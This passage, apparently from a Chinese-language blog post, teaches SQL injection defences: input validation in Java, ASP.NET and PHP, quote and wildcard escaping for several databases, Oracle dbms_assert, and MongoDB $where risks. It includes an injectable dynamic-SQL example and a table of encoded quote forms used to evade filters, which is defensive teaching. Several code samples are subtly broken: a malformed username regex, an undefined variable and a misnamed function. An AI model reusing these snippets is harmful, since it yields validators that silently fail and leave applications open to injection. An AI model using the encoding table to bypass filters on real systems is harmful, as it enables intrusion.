class="token keyword">implements</span> <span class="token class-name">Validator</span> <span class="token punctuation">{</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">validate</span><span class="token punctuation">(</span><span class="token class-name">FacesContext</span> facesContext<span class="token punctuation">,</span><span class="token class-name">UIComponent</span> uIComponent<span class="token punctuation">,</span> <span class="token class-name">Object</span> value<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ValidatorException</span><span class="token punctuation">{</span><span class="token comment">//获取用户名并转换为一个字符串</span><span class="token class-name">String</span> username <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span>value<span class="token punctuation">;</span><span class="token comment">//建立正则表达式</span><span class="token class-name">Pattern</span> p <span class="token operator">=</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span>compile <span class="token punctuation">(</span><span class="token string">"^[a-zA-z] {8, 12}$"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//匹配用户名</span><span class="token class-name">Matcher</span> m <span class="token operator">=</span> p<span class="token punctuation">.</span><span class="token function">matcher</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>matchFound<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token class-name">FacesMessage</span> message <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FacesMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>message<span class="token punctuation">.</span><span class="token function">setDetail</span><span class="token punctuation">(</span><span class="token string">"Not valid - it must be 8-12 letter only"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>message<span class="token punctuation">.</span><span class="token function">setSummary</span><span class="token punctuation">(</span><span class="token string">"Username not valid"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>message<span class="token punctuation">.</span><span class="token function">setseverity</span><span class="token punctuation">(</span><span class="token class-name">FacesMessage</span><span class="token punctuation">.</span><span class="token constant">SEVERITY_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ValidatorException</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>需要将下列内容添加到faces-config.xml文件中以便启用上述验证器</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>validator</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>validator-id</span><span class="token punctuation">&gt;</span></span>namespace.UsernameValidator<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>validator-id</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>validator-class</span><span class="token punctuation">&gt;</span></span>namespace.package.UsernameValidator<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>validatorclass</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>validator</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>接下来可以在相关的JSP文件中引用在faces-config.xml文件中添加的内容</p><pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;h:inputText value="username" id="username"required="true"&gt;&lt;f:validatorvalidatorId="namespace.UsernameValidator" /&gt;&lt;/h:inputText&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>在Java中实现输入验证时，还有一种很有用的资源OWASP ESAPI(Enterprise Security API)，包括org.owasp.esapi.reference.DefaultValidator输入验证类的实现，可以直接使用它，也可以将它作为自定义输入验证引擎的参考实现。</p><h4 id="NET中的输入验证"><a href="#NET中的输入验证" class="headerlink" title=".NET中的输入验证"></a>.NET中的输入验证</h4><p>ASP.NET提供了<code>Regular-Expression Validator</code>控件和<code>Custom Validator</code>控件，执行客户端验证。</p><p>下列代码是使用<code>RegularExpressionValidator</code>验证用户名的例子，用户名中只能包含字母(大写和小写)并且总长度必须介于8到12个字符之间。</p><pre class="line-numbers language-asp" data-language="asp"><code class="language-asp">&amp;ltasp:textbox id="userName" runat="server"/&gt;&amp;ltasp:RegularExpressionValidator id="usernameRegEx" runat="server" ControlToValidate="userName"ErrorMessage="Username must contain 8 - 12 letters only."ValidationExpression="^[a-zA-Z]{8,12}$" /&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>接下来的代码片段是使用<code>CustomValidator</code>验证口令是否为正确格式的例子。创建两个用户定义函数<code>PwdValidate</code>位于服务器上，负责对口令值进行验证；<code>ClientPwdValidate</code>位于客户端的JavaScript或VBScript中，负责对用户浏览器上的口令值进行验证。</p><pre class="line-numbers language-asp" data-language="asp"><code class="language-asp">&amp;ltasp:textbox id= "txt Pas sword" runat="server"/&gt;&amp;ltasp:CustomValidator runat="server" ControlToValidate="txtPassword"ClientValidationFunction="ClientPwdValidate"ErrorMessage="Password does not meet requirements."OnServerValidate="PwdValidate" /&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="PHP中的输入验证"><a href="#PHP中的输入验证" class="headerlink" title="PHP中的输入验证"></a>PHP中的输入验证</h4><p>PHP不直接依赖于表示层，因而PHP中的输入验证支持属于所使用的框架。许多PHP应用程序直接在代码中实现输入验证。</p><p>可以使用PHP中的很多函数作为构造输入验证的基本构造块，包括：</p><ul><li><p>preg_match(regex,matchstring):使用正则表达式regex对 matchstring执行正则表达式匹配。</p></li><li><p>is_&lt;type＞(input):检查输入是否＜type＞，例如 is_numeric()。</p></li><li><p>strlen(input)：检查输入的长度。</p></li></ul><p>使用preg_match验证表单参数：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/^[a-zA-Z] {8, 12}$/D"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//处理验证失败的情况</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="在移动应用程序中检验输入"><a href="#在移动应用程序中检验输入" class="headerlink" title="在移动应用程序中检验输入"></a>在移动应用程序中检验输入</h4><p>移动应用程序中的数据既可以存储在远程服务器上，也可以存储在本地的应用中。对于这两种情况都需要在本地检验输入。对于远程存储的数据，需要在远程服务器端对输入进行检查。</p><p>可以采用两种方式对输入搜索(in-device input)的输入数据进行检验。可以使用一种仅支持我们所期望数据类型的输入域类型(field type)，比如使用仅支持输入数字的输入域。另外也可以订阅输入域的change事件，当接收到无效输入时由事件处理程序进行处理。Android支持输入过滤器(input filter)的概念，它可以将一个或多个InputFilter的实现自动地应用于数据，并且可以拒绝无效的输入。</p><h4 id="在HTML5中检验输入"><a href="#在HTML5中检验输入" class="headerlink" title="在HTML5中检验输入"></a>在HTML5中检验输入</h4><p>在开发HTML5应用程序时，数据可以存储在Web浏览器的本地存储中，也可以存储在承载HTML5Web应用程序的远程Web服务器上。对于存储在浏览器本地存储中的数据，可以使用JavaScript检验数据，或者使用HTML5提供的新类型的＜input＞输入域进行检验。这些＜input＞输入域支持required属性，该属性指示浏览器检查在该输入域中必须具有输入值。此外，还支持pattern属性，允许开发人员设置一个正则表达式，输入的数据必须满足该正则表达式的约束：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;input type="text" required= "required" pattern:"^[0-9] {4}...<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果客户端应用程序正把数据发送回服务器端的应用程序， 那么服务器端代码必须总是重新检验它从HTML5应用程序中接收到的输入数据。</p><h3 id="编码输出"><a href="#编码输出" class="headerlink" title="编码输出"></a>编码输出</h3><h4 id="编码发送给数据库的内容"><a href="#编码发送给数据库的内容" class="headerlink" title="编码发送给数据库的内容"></a>编码发送给数据库的内容</h4><p>有时白名单过滤并不能完全，可能还会动态拼接产生SQL注入，对于无法或不适合使用参数化语句的情况，有必要对发送给数据库的数据进行编码（或引用）</p><h5 id="针对Oracle的编码"><a href="#针对Oracle的编码" class="headerlink" title="针对Oracle的编码"></a>针对Oracle的编码</h5><p>Oracle使用单引号作为字符串的结束符，因而有必要对包含在字符串（动态SQL中将包含该字符串）中的单引号进行编码。</p><p>在Oracle中，可以通过使用两个单引号替换单个单引号的方法来实现编码目的。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">sql <span class="token operator">=</span> sql<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"'"</span><span class="token punctuation">,</span><span class="token string">"''"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>由于在PL/SQL中需要为单引号添加引用符（因为它是字符串结束符），因而在PL/SQL中需要使用两个单引号来替换单个单引号。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">sql <span class="token operator">=</span> <span class="token function">replace</span><span class="token punctuation">(</span>sql<span class="token punctuation">,</span> '''<span class="token char">','</span>'''''''<span class="token punctuation">)</span>；sql <span class="token operator">=</span> <span class="token function">replace</span><span class="token punctuation">(</span>sql<span class="token punctuation">,</span> <span class="token function">CHR</span><span class="token punctuation">(</span><span class="token number">39</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">CHR</span><span class="token punctuation">(</span><span class="token number">39</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token function">CHR</span><span class="token punctuation">(</span><span class="token number">39</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>对LIKE字句的通配符转义</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">WHERE</span> name <span class="token operator">LIKE</span> <span class="token string">'a%'</span><span class="token comment">-- 易受攻击。返回所有以"a'字符开头的用户</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">WHERE</span> name <span class="token operator">LIKE</span> <span class="token string">'a\%'</span> <span class="token keyword">ESCAPE</span> <span class="token string">'\'-- 不容易受攻击，返回用户'</span>a<span class="token operator">%</span><span class="token string">',如果存在一个这样的用户的话'</span><span class="token comment">-- 使用ESCAPE子句时，可以指定任何单个字符作为转义字符</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>“q”引用，采用 q’[QUOTE CHAR]string[QUOTE CHAR]’格式。引用字符(quote character)可以是任何未出现在字符串中的单个字符</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">q<span class="token string">'(5%)'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果无法使用参数化查询，就应该使用dbms_assert包来执行输入验证。dbms_assert提供了7个不同的函数(ENQUOTE_LITERAL、ENQUOTE_ NAME、NOOP、QUALIFIED_SQL_NAME、 SCHEMA_NAME、SIMPLE_SQL_NAME和SQL_OBJECT_NAME)来验证不同类型的输入。</p><p>一个未使用dbms_assert的非安全查询(FIELD、OWNER和TABLE中存在SQL注入)：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">execute</span> immediate <span class="token string">'select'</span><span class="token operator">||</span> FIELD <span class="token operator">||</span><span class="token string">'from'</span><span class="token operator">||</span> OWNER <span class="token operator">||</span><span class="token string">'.'</span><span class="token operator">||</span> <span class="token keyword">TABLE</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>下面是相同的查询，不过使用了dbms_assert进行输入验证：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">execute</span> immediate <span class="token string">'select '</span> <span class="token operator">||</span>sys<span class="token punctuation">.</span>dbms_assert<span class="token punctuation">.</span>SIMPLE_SQL_NAME<span class="token punctuation">(</span>FIELD<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">'from'</span> <span class="token operator">||</span>sys<span class="token punctuation">.</span>dbms_assert<span class="token punctuation">.</span>ENQUOTE_NAME<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>dbms_assert<span class="token punctuation">.</span>SCHEMA_NAME<span class="token punctuation">(</span>OWNER<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token boolean">FALSE</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token string">'.'</span><span class="token operator">||</span>sys<span class="token punctuation">.</span>dbms_assert<span class="token punctuation">.</span>QUALIFIED_SQL_NAME<span class="token punctuation">(</span><span class="token keyword">TABLE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>dbms assert 函数</p><table><thead><tr><th align="left">函   数</th><th>描   述</th></tr></thead><tbody><tr><td align="left">DBMS_ASSERT.SCHEMA_NAME</td><td>该函数检查传递的字符串是否为数据库中存在的对象</td></tr><tr><td align="left">DBMS_ASSERT.SIMPLE_SQL_NAME</td><td>该函数检查SQL元素中是否只包含A-Z、a-z、0-9、$、 #和_这样的字符。如果使用双引号来引用参数，那么允许使用除双引号之外的所有字符</td></tr><tr><td align="left">DBMS_ASSERT.SQL_OBJECT_NAME</td><td>该函数检查传递的字符串是否为数据库中存在的对象</td></tr><tr><td align="left">DBMS_ASSERT.QUALIFIED_SQL_NAME</td><td>该函数与SIMPLE_SQL_NAME非常类似，不过它还允许数据库连接</td></tr><tr><td align="left">DBMS_ASSERT.ENQUOTE_LITERAL</td><td>该函数使用双引号来引用传递的参数。如果参数已被引用，就不做任何事情</td></tr><tr><td align="left">DBMS_ASSERT.ENQUOTE_NAME</td><td>如果未使用单引号引用用户提供的字符串，那么该函数会使用单引号来引用它</td></tr></tbody></table><h5 id="针对MS-SQL的编码"><a href="#针对MS-SQL的编码" class="headerlink" title="针对MS-SQL的编码"></a>针对MS-SQL的编码</h5><p>MS-SQL使用单引号作为字符串的结束符，因而有必要对包含在字符串（动态SQL中将包含该字符串）中的单引号进行编码。</p><p>在MS-SQL中，可以通过使用两个单引号替换单个单引号的方法来实现编码目的。</p><pre class="line-numbers language-C#" data-language="C#"><code class="language-C#">sql = sql.replace("'","''")<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>由于在Transact-SQL中需要为单引号添加引用符(因为它是字符串结束符)，因而在Transact-SQL中需要使用两个单引号来替换单个单引号。</p><pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">SET @enc = replace(@input,'''','''''''')//使用字符编码表示上述内容逻辑性会更强，也更加清楚：SET @enc = replace(@input, CHAR(39), CHAR(39) + CHAR(39));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>对LIKE字句的通配符转义</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token keyword">sql</span><span class="token punctuation">.</span><span class="token keyword">Replace</span><span class="token punctuation">(</span><span class="token string">"["</span><span class="token punctuation">,</span><span class="token string">"[[]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token keyword">sql</span><span class="token punctuation">.</span><span class="token keyword">Replace</span><span class="token punctuation">(</span><span class="token string">"%"</span><span class="token punctuation">,</span><span class="token string">"[%]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token keyword">sql</span><span class="token punctuation">.</span><span class="token keyword">Replace</span><span class="token punctuation">(</span><span class="token string">"_"</span><span class="token punctuation">,</span><span class="token string">"[_]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">WHERE</span> name <span class="token operator">LIKE</span> <span class="token string">'a%'</span><span class="token comment">-- 易受攻击。返回所有以"a'字符开头的用户</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">WHERE</span> name <span class="token operator">LIKE</span> <span class="token string">'a\%'</span> <span class="token keyword">ESCAPE</span> <span class="token string">'\'-- 不容易受攻击，返回用户'</span>a<span class="token operator">%</span><span class="token string">',如果存在一个这样的用户的话'</span><span class="token comment">-- 使用ESCAPE子句时，可以指定任何单个字符作为转义字符</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="针对MySQL的编码"><a href="#针对MySQL的编码" class="headerlink" title="针对MySQL的编码"></a>针对MySQL的编码</h5><p>由于MySQL使用单引号作为字符串字面量的结束符，因而有必要对包含在字符串(动态SQL中将包含该字符串)中的单引号进行编码。</p><p>在MySQL中，使用两个单引号替换单个单引号来实现编码目的，也可以使用反斜线()来引用单引号。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">sql <span class="token operator">=</span> sql<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"'"</span><span class="token punctuation">,</span><span class="token string">"\'"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>PHP还提供了mysql_real_escape()函数。该函数会自动使用反斜线来引用单引号及其他具有潜在危害的字符，例如0x00(NULL)、换行符(\n)、回车符(\r)、双引号(“)、反斜线() 和 Ox1A(Ctrl+Z)</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>由于需要为单引号添加引用符(因为它是字符串结束符)，因而在存储过程代码中需要使用两个单引号来替换单个单引号。</p><pre class="line-numbers language-C#" data-language="C#"><code class="language-C#">SET @sql = REPLACE(@sql,'\'','\\\'')//使用字符编码表示上述内容逻辑性会更强，也更加清楚：SET @enc = REPLACE(@input, CHAR(39) , CHAR(92, 39));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>对LIKE字句的通配符转义</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token keyword">sql</span><span class="token punctuation">.</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token string">"%"</span><span class="token punctuation">,</span><span class="token string">"\%"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token keyword">sql</span><span class="token punctuation">.</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token string">"_"</span><span class="token punctuation">,</span><span class="token string">"\_"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="针对PostgreSQL的编码"><a href="#针对PostgreSQL的编码" class="headerlink" title="针对PostgreSQL的编码"></a>针对PostgreSQL的编码</h5><p>PostgreSQL也使用单引号作为字符串字面量的结束符，可以采用两种办法对单引号进行编码。</p><p>第一种方法使用两个单引号替换一个单引号。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$encodedValue</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"'"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"''"</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第二种办法是使用一个反斜线对单引号进行编码，但PostgreSQL还需要在字符串字面量之前放置一个大写的E字母</p><pre class="line-numbers language-plsql" data-language="plsql"><code class="language-plsql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> User <span class="token keyword">WHERE</span> LastName<span class="token operator">=</span>E<span class="token string">'O\'Boyle'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在PHP中，可以使用add_slashes()或str_replace()方法对反斜线执行编码。在PHP中，对于PostgreSQL数据库而言，最佳的字符串编码方式是使用pq_escape_string()方法：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$encodedValue</span> <span class="token operator">=</span> <span class="token function">pg_escape_string</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>该函数将调用libpq的PQescapeString()方法，它将把单反斜线替换为双反斜线，并且用两个单引号替换一个单引号</p><p>在PostgreSQL中还可以采用其他办法创建字符串字面量，即使用$字符。$字符允许开发人员在SQL语句中使用类似于标记(tag-like)的功能。下面就是一个使用这种语法创建的字符串：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token keyword">User</span> <span class="token keyword">WHERE</span> LastName<span class="token operator">=</span>$quote$O'Boyle$quote$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在这种情况下，对于用户输入的任何一个$字符，都需要确保使用一个反斜线进行转义处理： </p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$encodedValue</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"$"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"\\$"</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="防止NoSQL注入"><a href="#防止NoSQL注入" class="headerlink" title="防止NoSQL注入"></a>防止NoSQL注入</h5><p>在NoSQL的查询API中，绝大多数方法都提供了将数据与代码清晰分离的方法。例如，当从PHP中使用MongoDB时，典型的方法是使用关联数组(associative array)插入数据：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$users</span><span class="token operator">-&gt;</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"username"</span><span class="token operator">=&gt;</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"password"</span> <span class="token operator">=&gt;</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查询则如下所示：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$user</span> <span class="token operator">=</span> <span class="token variable">$users</span><span class="token operator">-&gt;</span><span class="token function">findOne</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"username"</span> <span class="token operator">=&gt;</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>当使用这些API时，由于避免了使用字符串连接来构造查询，因此防止了注入攻击。</p><p>对于更高级的查询，MongoDB允许开发人员使用$where关键字提交一个JavaScript函数：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$collection</span><span class="token operator">-&gt;</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\$where"</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">"function(){ return this.username.indexOf('<span class="token interpolation"><span class="token variable">$test</span></span>') &gt; -1 }"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>该JavaScript函数很容易遭到注入攻击。攻击者可以转义indexOf()内的字符串，并改变查询执行的方式。为了防止这种攻击，我们必须对JavaScript进行编码。使用十六进制的\xnn编码类型，或使用\unnnn类型的Unicode编码，对所有非字母或数字的字符全部进行转 义，这是最安全的办法。</p><h3 id="规范化"><a href="#规范化" class="headerlink" title="规范化"></a>规范化</h3><p>避开输入验证和输出编码的常用技术是：在将输入发送给应用程序之前对其进行编码，之后再对其进行解码和解释以符合攻击者的目标。</p><p>单引号的例子</p><table><thead><tr><th align="center">表示</th><th align="center">编码类型</th></tr></thead><tbody><tr><td align="center">%27</td><td align="center">URL编码</td></tr><tr><td align="center">%2527</td><td align="center">双URL编码</td></tr><tr><td align="center">%%317</td><td align="center">嵌套的双URL编码</td></tr><tr><td align="center">%u0027</td><td align="center">Unicode 表示</td></tr><tr><td align="center">%u02b9</td><td align="center">Unicode 表示</td></tr><tr><td align="center">%ca%b9</td><td align="center">Unicode 表示</td></tr><tr><td align="center">&amp;apos</td><td align="center">HTML实体</td></tr><tr><td align="center">&amp;#39</td><td align="center">十进制HTML实体</td></tr><tr><td align="center">&amp;#x27</td><td align="center">十六进制HTML实体</td></tr><tr><td align="center">%26apos</td><td align="center">混合的URL/HTML编码</td></tr></tbody></table><p>规范化是指将输入简化成标准或简单的形式，例如变成单引号</p><h4 id="规格化方法"><a href="#规格化方法" class="headerlink" title="规格化方法"></a>规格化方法</h4><ul><li>拒绝所有不符合格式的输入，例如利用白名单拒绝所有编码输入</li><li>对输入多次解码，或者解码一次，若还需解码就抛弃</li></ul><h5 id="适用于Unicode的方法"><a href="#适用于Unicode的方法" class="headerlink" title="适用于Unicode的方法"></a>适用于Unicode的方法</h5><p>遇到像UTF-8这样的Unicode输入时，一种方法是将输入标准化（normalization）。该方法使用定义好的规则集将Unicode转换成最简单的形式。将双倍宽度及其他的Unicode编码在它们所处的位置转换成各自的ASCII 等价形式。</p><p>使用Java中的Normalizer类（Java 6及以上版本）来将输入标准化</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">normalized <span class="token operator">=</span> <span class="token class-name">Normalizer</span><span class="token punctuation">.</span><span class="token function">normalize</span><span class="token punctuation">(</span>input<span class="token punctuation">,</span><span class="token class-name">Normalizer<span class="token punctuation">.</span>Form</span><span class="token punctuation">.</span><span class="token constant">NFKC</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用C#中String类的Normalize方法来将输入标准化</p><pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">normalized = input.Normalize(NormalizationForm.FormKC);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用PHP中PEAR库的PEAR::I18N_UnicodeNormalizer包来将输入标准化</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$normalized</span> <span class="token operator">=</span> <span class="token class-name static-context">I18N_UnicodeNormalizer</span><span class="token operator">::</span><span class="token function">toNFKC</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'UTF-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>还有一种方法是首先检查Unicode是有效的，然后将数据转换成一种可预见的格式，例如像ISO-8859-1这样的西欧字符集。</p><p>用于解析UTF-8的正则表达式</p><table><thead><tr><th align="center">正则表达式</th><th align="center">描   述</th></tr></thead><tbody><tr><td align="center">[x00-\x7F]</td><td align="center">ASCII</td></tr><tr><td align="center">[\xC2-\xDF][\x80-\xBF]</td><td align="center">双字节表示</td></tr><tr><td align="center">\xE0[\xA0-\xBF][\x80-\xBF]</td><td align="center">双字节表示</td></tr><tr><td align="center">[\xEl-\xEC\xEE\xEF][\x80-\xBF] {2}</td><td align="center">三字节表示</td></tr><tr><td align="center">\xED [\x80-\x9F][\x80-\xBF]</td><td align="center">三字节表示</td></tr><tr><td align="center">\xFO [\x90-\xBF][\x80-\xBF] {2}</td><td align="center">plane 1 至ij 3</td></tr><tr><td align="center">[\xF 1 -\xF3][\x80-\xBF] {3}</td><td align="center">panel 4 到 15</td></tr><tr><td align="center">\xF4 [\x80-\x8F][\x80-\xBF] {2}</td><td align="center">panel 16</td></tr></tbody></table><p>检查完输入是有效的格式后，现在可以将它转换成可预见的格式。</p><p>在Java中，可以使用CharsetEncoder类或比较简单的getBytes()方法（Java 6及之后的版本）</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">string ascii <span class="token operator">=</span> utf8<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token string">"ISO-8859-1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在C#中，可以使用Encoding.Converter类</p><pre class="line-numbers language-C#" data-language="C#"><code class="language-C#">byte[] asciiBytes = Encoding.Convert(Encoding.UTF8,Encoding.ASCII,utf8Bytes);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在PHP中，可以使用utf8_decode</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">ascii <span class="token operator">=</span> <span class="token function">utf8_decode</span><span class="token punctuation">(</span><span class="token variable">$utf8string</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span 